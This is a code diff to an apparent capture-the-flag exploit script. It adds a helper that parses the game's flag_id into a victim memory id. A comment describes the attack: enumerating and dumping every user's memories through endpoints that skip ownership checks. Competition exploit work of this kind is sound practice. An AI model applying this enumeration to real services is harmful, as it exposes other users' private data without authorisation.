@@ -46,6 +46,7 @@ Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = victim memory
 Deps: requests (stdlib base64/re otherwise).
 """
 import base64
+import json
 import random
 import re
 import string
@@ -125,10 +126,33 @@ def _session(base, force=False):
     return s, fid
 
 
+def _mid_from_flag_id(flag_id):
+    """Live attack-data hands flag_id as a JSON string {"fly_id": "...",
+    "memory_id": "..."}; the memory endpoints key on the memory id. Return that mid.
+    Tolerate a bare id string (manual runs / older format) and a dict too."""
+    if flag_id is None:
+        return None
+    obj = flag_id
+    if isinstance(flag_id, str):
+        s = flag_id.strip()
+        if not s:
+            return None
+        if s[0] != "{":
+            return s                       # already a bare mid
+        try:
+            obj = json.loads(s)
+        except ValueError:
+            return s
+    if isinstance(obj, dict):
+        mid = obj.get("memory_id") or obj.get("mid") or obj.get("id")
+        return str(mid).strip() if mid else None
+    return str(obj).strip() or None
+
+
 def _targets(s, base, flag_id):
     if flag_id is not None:
-        fid = str(flag_id).strip()
-        return [fid] if fid else []
+        mid = _mid_from_flag_id(flag_id)
+        return [mid] if mid else []
     # no id -> enumerate: public flies, then each fly's memory ids (neither endpoint
     # checks ownership), and dump them all.
     mids = []
